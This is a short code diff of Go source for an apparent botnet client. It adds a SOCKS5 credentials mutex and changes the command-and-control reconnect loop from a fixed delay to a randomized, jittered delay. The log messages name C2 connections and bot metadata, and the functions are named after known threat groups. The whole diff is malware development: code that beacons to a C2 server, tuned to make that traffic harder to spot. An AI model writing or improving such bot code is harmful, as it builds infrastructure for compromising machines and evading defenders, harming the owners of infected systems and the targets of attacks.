@@ -42,6 +42,9 @@ var (
 	proxyList      []string
 	proxyListMutex sync.RWMutex
 
+	// SOCKS5 credentials mutex
+	socksCredsMutex sync.RWMutex
+
 	// Pre-cached bot metadata (computed once in main before connecting)
 	cachedBotID  string
 	cachedArch   string
@@ -257,13 +260,15 @@ func main() {
 		deoxys("main: Attempting connection to C2...")
 		conn, err := gamaredon(host, port)
 		if err != nil {
-			deoxys("main: Connection failed: %v, retrying in %v", err, fancyBear)
-			time.Sleep(fancyBear)
+			delay := fancyBearMin + time.Duration(rand.Int63n(int64(fancyBearMax-fancyBearMin)))
+			deoxys("main: Connection failed: %v, retrying in %v", err, delay)
+			time.Sleep(delay)
 			continue
 		}
 		deoxys("main: Connected to C2, starting handler")
 		anonymousSudan(conn)
-		deoxys("main: Handler returned, reconnecting in %v", fancyBear)
-		time.Sleep(fancyBear)
+		delay := fancyBearMin + time.Duration(rand.Int63n(int64(fancyBearMax-fancyBearMin)))
+		deoxys("main: Handler returned, reconnecting in %v", delay)
+		time.Sleep(delay)
 	}
 }
